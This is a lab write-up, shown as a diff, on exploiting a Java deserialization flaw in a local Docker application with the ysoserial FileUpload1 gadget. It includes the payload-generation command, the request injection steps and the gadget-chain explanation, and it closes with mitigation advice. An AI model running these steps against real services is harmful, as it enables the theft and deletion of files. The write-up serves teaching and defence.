@@ -1,0 +1,46 @@
+ysoserial FileUpload1 -  Write-up
+===================================================
+
+Environment
+-----------
+The host system is running on Docker Desktop with Linux based containers. The victim exposes the application at http://localhost:8083. The attacker steps are executed on a Linux OS.
+
+Vulnerability
+-------------
+The endpoint /java/aggiungi_quadro decodes from Base64 the user-controlled painting_entry parameter and passes the resulting bytes to ObjectInputStream.readObject(). The application checks whether the returned object is a PaintingEntry only after deserialization, when a gadget may already have produced a side effect.
+
+Reproduction
+------------
+1. Start the FileUpload victim from the yoserial directory:
+
+    docker compose up -d --build 
+
+    docker exec -it yoserial_lab bash
+
+2. On the attacker-side.
+
+    mkdir -p /opt/ysoserial \
+    && curl -fsSL -o /opt/ysoserial/ysoserial.jar \
+       https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
+
+    java -jar /opt/ysoserial/ysoserial.jar FileUpload1 "copyAndDelete;/opt/flag.txt;/var/www/static" | base64 -w0
+
+3. Intercept a legitimate painting submission with Burp Suite Repeater. Replace the value of painting_entry with the generated payload and send the request to:
+
+    POST http://localhost:8083/java/aggiungi_quadro
+
+4. List the destination directory through the laboratory web endpoint:
+
+    curl http://localhost:8083/static/
+
+The copied data appears under a generated name similar to:
+
+    upload_<UUID>_00000000.tmp
+
+Why it works
+------------
+FileUpload1 serializes a crafted DiskFileItem whose dfosFile field identifies /opt/flag.txt, repository identifies /var/www/static, sizeThreshold is zero, and cachedContent is null. On the target, ObjectInputStream invokes DiskFileItem.readObject(). That method restores the controlled fields, opens the source file, and uses IOUtils.copy() to write it to a generated temporary file in the selected directory. It then calls File.delete() on the source without checking the result. Only afterward does the application reject the DiskFileItem because it is not a Painting.
+
+Mitigation
+----------
+Do not deserialize untrusted native Java objects. Prefer JSON mapped and validate every field. If native serialization is temporarily unavoidable consider the apply of an ObjectInputFilter.
